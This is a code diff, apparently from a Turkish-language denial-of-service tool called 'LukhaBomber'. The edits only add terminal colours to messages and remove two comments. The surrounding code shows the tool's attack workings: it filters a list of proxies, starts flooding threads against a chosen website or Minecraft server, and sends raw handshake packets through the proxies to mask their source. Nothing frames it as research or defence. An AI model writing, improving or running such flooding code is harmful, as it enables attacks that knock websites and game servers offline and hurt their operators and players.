@@ -34,11 +34,11 @@ class LukhaBomber:
             with open("proxy.txt", "r") as f:
                 proxies = [line.strip() for line in f if ":" in line]
             if not proxies:
-                print("Proxy listesi boş veya bulunamadı!")
+                print("\033[91mProxy listesi boş veya bulunamadı!\033[0m")
                 sys.exit(1)
             return proxies
         except FileNotFoundError:
-            print("proxy.txt dosyası bulunamadı!")
+            print("\033[91mproxy.txt dosyası bulunamadı!\033[0m")
             sys.exit(1)
 
     def test_proxy(self, proxy):
@@ -57,15 +57,15 @@ class LukhaBomber:
             return False
 
     def filter_proxies(self):
-        print(f"Toplam proxy: {len(self.proxies)}. Çalışan proxyler test ediliyor...")
+        print(f"Toplam proxy: {len(self.proxies)}. \033[93mÇalışan proxyler test ediliyor...\033[0m")
         for proxy in self.proxies:
             if self.test_proxy(proxy):
                 self.good_proxies.append(proxy)
             else:
                 self.bad_proxies.append(proxy)
-        print(f"Çalışan proxy sayısı: {len(self.good_proxies)}")
+        print(f"\033[92mÇalışan proxy sayısı: {len(self.good_proxies)}\033[0m")
         if len(self.good_proxies) == 0:
-            print("Çalışan proxy bulunamadı! Program sonlandırılıyor.")
+            print("\033[91mÇalışan proxy bulunamadı! Program sonlandırılıyor.\033[0m")
             sys.exit(1)
 
     def create_socket(self, proxy_ip, proxy_port):
@@ -137,8 +137,6 @@ class LukhaBomber:
             try:
                 s = self.create_socket(ip, port)
                 s.connect((self.target, self.port))
-                # Minecraft handshake + ping packet
-                # Basit handshake paketi (server 25565 için)
                 packet = b"\x00" + b"\x00" + b"\x0f" + b"\x00" + b"\x04" + bytes(self.target, 'utf-8') + self.port.to_bytes(2, 'big') + b"\x01"
                 s.send(packet)
                 with self.lock:
@@ -158,7 +156,7 @@ class LukhaBomber:
 
     def start(self):
         self.filter_proxies()
-        print(f"Başlıyor... Hedef: {self.target}:{self.port}, Proxy Tipi: {self.proxy_type}, Hedef Türü: {self.attack_target}")
+        print(f"\033[93mBaşlıyor... Hedef: {self.target}:{self.port}, Proxy Tipi: {self.proxy_type}, Hedef Türü: {self.attack_target}\033[0m")
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             if self.attack_target == "site":
                 half_threads = max(1, self.threads // 2)
@@ -170,7 +168,7 @@ class LukhaBomber:
                 for _ in range(self.threads):
                     executor.submit(self.minecraft_flood)
             else:
-                print("Geçersiz hedef türü seçildi!")
+                print("\033[91mGeçersiz hedef türü seçildi!\033[0m")
                 self.running = False
                 return
 
@@ -181,10 +179,10 @@ class LukhaBomber:
         print(f"Toplam paket: {self.counter}")
         print(f"Başarılı: {self.success}")
         print(f"Başarısız: {self.failed}")
-        print("\nİyi proxyler:")
+        print("\n\033[92mİyi proxyler:\033[0m")
         for p in self.good_proxies:
             print(" - " + p)
         if self.bad_proxies:
-            print("\nKötü proxyler:")
+            print("\n\033[91mKötü proxyler:\033[0m")
             for p in self.bad_proxies:
                 print(" - " + p)
